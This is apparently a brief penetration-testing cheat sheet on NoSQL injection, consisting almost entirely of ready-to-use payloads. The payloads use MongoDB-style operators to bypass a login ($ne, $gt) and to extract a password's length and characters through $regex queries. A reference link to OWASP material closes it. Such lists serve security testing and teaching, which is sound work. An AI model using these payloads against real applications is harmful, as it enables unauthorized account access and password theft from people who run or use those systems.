# NoSQL injection

## Login Bypass

```json
username=hermes&password[$ne]=hermes
username=hermes&password[%24ne]=

{"username": {"$eq": "hermes"}, "password": {"$ne": "hermes"}}
{"username": {"$eq": "hermes"}, "password": {"$gt": ""}}
```

## Extract length

```json
username=hermes&password[$regex]=.{6}
```

## Extract password

```json
username=hermes&password[$regex]=her.{3}

{"username": {"$eq": "hermes"}, "password": {"$regex": "^her" }}
```

# References

- [NoSQL injection - OWASP](https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf)